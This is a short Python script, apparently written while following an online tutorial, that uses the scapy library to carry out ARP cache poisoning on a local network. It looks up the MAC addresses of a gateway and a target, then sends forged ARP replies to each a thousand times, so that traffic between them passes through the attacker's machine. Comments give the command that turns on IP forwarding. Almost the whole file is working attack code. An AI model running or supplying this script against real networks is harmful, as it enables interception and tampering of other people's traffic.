#tutorial: https://medium.datadriveninvestor.com/arp-cache-poisoning-using-scapy-d6711ecbe112 
#this command: echo 1 > /proc/sys/net/ipv4/ip_forward.
#this command reveals arp table: arp -a 
import scapy.all as scapy
import time

def findMacAddr(ip):
    arp_req = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=1, pdst=ip)
    answers = scapy.srp(arp_req, timeout=5)
    if answers is not None:
        if answers[0] is not None:
            response = answers[0][0][1].hwsrc
            return response

#findMacAddr("192.168.1.1")
#findMacAddr("192.168.1.2")

def tell_lies(gateway_ip, gateway_mac, target_ip, target_mac):
    hey_router = scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip,hwdst=gateway_mac)
    hey_target= scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip,hwdst=target_mac)
    scapy.send(hey_router)
    scapy.send(hey_target)

def switcharoo(gateway_ip, target_ip):
    gateway_mac = findMacAddr(gateway_ip)
    target_mac = findMacAddr(target_ip)
    for i in range(0, 1000):
        tell_lies(gateway_ip, gateway_mac, target_ip, target_mac)
    
switcharoo("192.168.1.1", "192.168.1.2")
#for i in range(0, 1000):
#    tell_lies("192.168.1.1","0c:73:29:4d:48:10","192.168.1.2","52:00:86:26:56:53")